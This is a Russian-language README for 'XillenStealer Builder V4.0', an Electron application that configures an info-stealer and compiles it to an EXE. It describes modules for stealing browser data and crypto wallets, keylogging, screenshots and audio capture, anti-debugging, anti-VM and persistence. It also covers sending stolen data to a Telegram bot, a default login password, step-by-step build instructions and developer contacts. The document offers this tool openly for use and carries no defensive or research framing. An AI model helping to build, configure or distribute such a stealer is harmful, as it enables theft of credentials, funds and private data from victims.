# XillenStealer Builder V4.0 - Electron Edition

Современный билдер стиллера на Electron с крутым дизайном и полным функционалом.

## 🚀 Особенности

- **Современный UI** - Темный дизайн с эффектами и анимациями
- **Две темы** - Deep Dark и Scarlet
- **Эффект дождя** - Опциональный визуальный эффект
- **Прозрачность окна** - Настраиваемая прозрачность
- **Все модули** - 24 модуля стиллера V4.0
- **Компиляция в EXE** - Автоматическая сборка через PyInstaller
- **Система уведомлений** - Красивые уведомления о статусе операций

## 📁 Структура проекта

```
electron_builder/
├── main.js              # Главный процесс Electron
├── preload.js           # Мост между renderer и main
├── package.json         # Зависимости Node.js
├── builder_backend.py   # Python бэкенд для сборки
├── renderer/
│   ├── index.html       # UI билдера
│   ├── style.css        # Стили с темами
│   ├── renderer.js      # Логика UI
│   └── assets/
│       ├── logo.png     # Логотип (нужно создать)
│       └── bg.png       # Фон (опционально)
└── README.md            # Этот файл
```

## 🛠 Установка и запуск

### 1. Установка зависимостей

```bash
cd electron_builder
npm install
```

### 2. Создание логотипа

Используйте один из промптов ниже для генерации логотипа:

#### Промпт 1 (Основной):
```
Cyberpunk hacker logo for 'XillenStealer', dark theme with neon green accent (#34D399), minimalist geometric design, circuit board pattern, digital matrix style, skull or anonymous mask silhouette with binary code elements, glowing edges, tech aesthetic, transparent background, 512x512px, suitable for dark UI
```

#### Промпт 2 (Альтернативный):
```
Dark minimal logo: letter 'X' made from circuit board traces, neon green glow (#34D399), binary code flowing through circuits, black background with subtle tech pattern, hacker aesthetic, clean lines, modern cyberpunk style, 512x512px PNG
```

#### Промпт 3 (Простой):
```
Minimalist 'X' logo, cyberpunk style, neon green (#34D399), circuit board texture, dark background, glowing effect, 512x512px, transparent background, modern tech aesthetic
```

Сохраните логотип как `renderer/assets/logo.png`

### 3. Запуск

```bash
npm start
```

## 🎨 Экраны приложения

### 1. Авторизация
- Ввод пароля (по умолчанию: `layscrab`)
- Анимация входа
- Переход на главный экран

### 2. Создание стиллера
- **Основные настройки**:
  - Имя стиллера
  - Токен Telegram бота
  - Chat ID
  - Задержка запуска
  - Размер чанка

- **Модули** (24 штуки):
  - Браузеры, кошельки, система
  - Скриншот, аудио, keylogger
  - Анти-отладка, анти-VM
  - Персистентность, UEFI, и т.д.

- **Действия**:
  - Создать .py файл
  - Скомпилировать в .exe
  - Логи сборки в реальном времени

### 3. Мои сборки
- Список всех созданных файлов
- Статистика (количество, размер)
- Открытие папки builds

### 4. Настройки
- **Темы**: Deep Dark, Scarlet
- **Прозрачность окна** (0.5-1.0)
- **Эффект дождя** (вкл/выкл)

### 5. О программе
- Информация о команде
- Список возможностей стиллера
- Контакты разработчиков

### 6. Руководство
- Быстрый старт
- Описание модулей
- Инструкции по компиляции

## 🔧 Технические детали

### Архитектура
- **Frontend**: Electron (HTML/CSS/JS)
- **Backend**: Python скрипт (builder_backend.py)
- **Связь**: IPC через Electron

### Python Backend
- Чтение и модификация stealer.py
- Создание .py файлов с настройками
- Компиляция в .exe через PyInstaller
- Получение списка сборок и статистики

### IPC Команды
```json
{"cmd": "check_password", "params": {"password": "..."}}
{"cmd": "build", "params": {...}}
{"cmd": "compile", "params": {"path": "...", "name": "..."}}
{"cmd": "get_builds"}
{"cmd": "get_stats"}
```

## 🎯 Использование

1. **Запустите приложение** - `npm start`
2. **Введите пароль** - по умолчанию `layscrab`
3. **Настройте стиллер**:
   - Введите токен бота и Chat ID
   - Выберите нужные модули
   - Настройте параметры
4. **Создайте стиллер** - нажмите "Создать"
5. **Скомпилируйте** - выберите "Да" для создания .exe
6. **Найдите файлы** - в папке `builds/`

## 🎨 Темы

### Deep Dark (по умолчанию)
- Основной цвет: #34D399 (неоновый зеленый)
- Фон: #18191d (темно-серый)
- Панели: #22232a (серый)

### Scarlet
- Основной цвет: #ff595e (красный)
- Фон: #12090b (темно-красный)
- Панели: #1a1013 (красно-серый)

## ⚡ Эффекты

### Эффект дождя
- Опциональный визуальный эффект
- Падающие цифры/символы
- Настраивается в настройках

### Прозрачность окна
- Диапазон: 0.5 - 1.0
- Настраивается слайдером
- Сохраняется между сессиями

## 🔒 Безопасность

- Пароль хешируется SHA256
- IPC изоляция между процессами
- Проверка входных данных
- Безопасная работа с файлами

## 📝 Логи

Все операции логируются в реальном времени:
- Создание стиллера
- Компиляция в EXE
- Ошибки и предупреждения
- Статус операций

## 🐛 Отладка

Если что-то не работает:

1. **Проверьте Python** - должен быть установлен Python 3
2. **Проверьте зависимости** - PyInstaller, все модули стиллера
3. **Проверьте файлы** - stealer.py должен быть в корне проекта
4. **Проверьте логи** - смотрите консоль разработчика (F12)

## 📞 Поддержка

- **Главный разработчик**: BengaminButton
- **GitHub**: https://github.com/BengaminButton
- **Telegram**: @Bengamin_Button
- **Команда**: XillenKillers (@XillenKillers)

## 📄 Лицензия

MIT License - используйте на свой страх и риск.

---

**Разработано командой XillenKillers | 2025**
